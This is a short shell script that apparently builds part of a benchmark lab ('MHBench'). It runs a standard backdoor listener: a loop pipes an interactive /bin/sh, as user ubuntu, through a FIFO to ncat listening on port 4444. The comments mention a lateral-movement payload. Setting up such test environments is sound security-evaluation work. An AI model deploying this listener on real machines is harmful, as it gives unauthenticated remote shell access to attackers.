#!/bin/sh
# Reproduces MHBench's own netcat_shell.yml playbook pattern exactly (a
# published, standard backdoor-listener loop - see docker/mhbench/README.md).
# Runs as the low-priv "ubuntu" user via `su`, matching that playbook's
# "{{ user }}"-scoped listener (no privilege escalation in this topology).
while true; do
  rm -f /tmp/f
  mkfifo /tmp/f
  chmod 666 /tmp/f
  # "su -" (login shell) so the backdoor shell starts in ubuntu's own HOME,
  # not wherever this script's cwd happens to be - otherwise a payload that
  # writes to its cwd (e.g. "curl ... > splunkd") hits Permission denied
  # (found manually reproducing NCLateralMove's command; see git history).
  su - ubuntu -c 'cat /tmp/f | /bin/sh -i 2>&1 | ncat -lnvp 4444 >/tmp/f'
done
